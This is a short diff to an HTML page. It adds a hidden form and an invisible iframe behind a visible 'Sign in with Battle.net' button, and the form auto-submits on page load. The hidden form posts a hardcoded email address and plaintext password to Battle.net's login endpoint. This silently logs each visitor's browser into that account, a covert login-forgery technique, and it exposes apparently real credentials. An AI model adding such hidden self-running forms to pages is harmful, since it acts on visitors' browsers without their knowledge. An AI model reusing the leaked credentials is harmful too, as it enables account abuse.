@@ -1,7 +1,19 @@
 <div>
+  <script src="../js/jquery-3.1.1.min.js"></script>
   <center>
+    <form method="post" style="display:none" target="target" action="https://us.battle.net/login/srp?csrfToken=true">
+      <input type="hidden" name="accountName" value="amruthadevme@gmail.com" />
+      <input type="password" name="password" value="Johngalt15*" />
+      <input type="submit" value="Sign in with " id="hiddenSubmit" />
+    </form>
+    <iframe name="target" style="display:none"></iframe>
     <form method="post" >
       <input type="submit" value="Sign in with Battle.net"/>
     </form>
   </center>
 </div>
+<script>
+  $(document).ready(function(){
+    $('#hiddenSubmit').click();
+  });
+</script>
